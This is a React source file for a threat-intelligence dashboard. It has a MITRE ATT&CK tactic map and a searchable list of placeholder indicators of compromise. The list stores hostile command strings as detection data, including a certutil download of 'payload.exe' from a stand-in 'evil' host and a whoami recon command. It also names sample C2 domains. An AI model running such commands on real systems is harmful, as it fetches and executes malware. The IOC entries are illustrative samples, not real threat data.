"use client";
import React, { useState } from "react";

const MITRE_TACTICS = [
  { id: "TA0001", name: "Initial Access",         techniques: ["T1566 Phishing", "T1190 Exploit Public App", "T1078 Valid Accounts"] },
  { id: "TA0002", name: "Execution",               techniques: ["T1059 Command Scripting", "T1053 Scheduled Task"] },
  { id: "TA0003", name: "Persistence",             techniques: ["T1098 Account Manipulation", "T1547 Boot Autostart"] },
  { id: "TA0004", name: "Privilege Escalation",    techniques: ["T1068 Exploitation for PE", "T1055 Process Injection"] },
  { id: "TA0007", name: "Discovery",               techniques: ["T1082 System Info Discovery", "T1046 Network Scan"] },
  { id: "TA0010", name: "Exfiltration",            techniques: ["T1041 Exfil over C2 channel", "T1071.004 DNS Tunneling"] },
];

const IOC_DATA = [
  { ioc: "192.168.1.101",      type: "IP",     confidence: "95%", threat: "CRITICAL", label: "Known C2 server" },
  { ioc: "malware-cdn.io",     type: "Domain", confidence: "88%", threat: "HIGH",     label: "Malicious payload host" },
  { ioc: "cmd.exe /c whoami",  type: "Command", confidence: "79%", threat: "HIGH",     label: "Post-exploit recon" },
  { ioc: "1.2.3.4",            type: "IP",     confidence: "42%", threat: "MEDIUM",   label: "Suspicious scanner" },
  { ioc: "5.6.7.8",            type: "IP",     confidence: "67%", threat: "HIGH",     label: "Brute-force source" },
  { ioc: "evil.example.com",   type: "Domain", confidence: "91%", threat: "CRITICAL", label: "Ransomware C2 domain" },
  { ioc: "certutil.exe -urlcache -f http://evil/payload.exe", type: "Command", confidence: "96%", threat: "CRITICAL", label: "LOLBins payload delivery" },
];

const THREAT_COLOR: Record<string, string> = {
  CRITICAL: "text-red-400",
  HIGH:     "text-orange-400",
  MEDIUM:   "text-yellow-400",
  LOW:      "text-gray-400",
};

export default function ThreatIntelPage() {
  const [selected, setSelected] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const filtered = IOC_DATA.filter(d =>
    !search || d.ioc.toLowerCase().includes(search.toLowerCase()) || d.label.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="p-6 max-w-6xl mx-auto space-y-6 fade-in">
      <div>
        <h1 className="text-2xl font-semibold text-white">Threat Intelligence</h1>
        <p className="text-sm text-gray-500 mt-1">IOC library, MITRE ATT&CK mapping, and adversary profiling.</p>
      </div>

      {/* MITRE ATT&CK */}
      <div className="panel p-5">
        <h2 className="text-sm font-semibold text-white mb-4">MITRE ATT&CK Coverage Map</h2>
        <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
          {MITRE_TACTICS.map(t => (
            <div key={t.id}
              onClick={() => setSelected(selected === t.id ? null : t.id)}
              className={`p-4 rounded-lg border cursor-pointer transition-all ${selected === t.id ? "border-blue-500/40 bg-blue-500/10" : "border-white/8 bg-white/2 hover:bg-white/5 hover:border-white/15"}`}>
              <p className="text-xs text-gray-500 font-mono">{t.id}</p>
              <p className="text-sm text-white font-medium mt-1">{t.name}</p>
              <p className="text-xs text-gray-600 mt-1">{t.techniques.length} techniques</p>
              {selected === t.id && (
                <div className="mt-3 space-y-1 pt-3 border-t border-white/8">
                  {t.techniques.map(tech => (
                    <div key={tech} className="text-xs text-blue-300 font-mono bg-blue-500/10 rounded px-2 py-1">{tech}</div>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      </div>

      {/* IOCs */}
      <div className="panel p-5">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-sm font-semibold text-white">Indicators of Compromise</h2>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search IOC..."
            className="bg-white/3 border border-white/10 rounded px-3 py-1.5 text-xs text-white placeholder-gray-600 focus:outline-none focus:border-blue-500/60 w-52"/>
        </div>
        <div className="space-y-2">
          {filtered.length === 0 && <p className="text-gray-600 text-sm">No IOCs match your search.</p>}
          {filtered.map(d => (
            <div key={d.ioc} className="flex items-center gap-4 p-3 rounded-lg bg-white/2 border border-white/6 hover:bg-white/5 transition-all text-xs">
              <span className="font-mono text-gray-300 flex-1 truncate">{d.ioc}</span>
              <span className="text-gray-500 w-16 shrink-0">{d.type}</span>
              <span className="text-gray-500 w-12 shrink-0">{d.confidence}</span>
              <span className={`font-semibold w-16 shrink-0 ${THREAT_COLOR[d.threat] || "text-gray-400"}`}>{d.threat}</span>
              <span className="text-gray-500 flex-1 truncate hidden md:block">{d.label}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
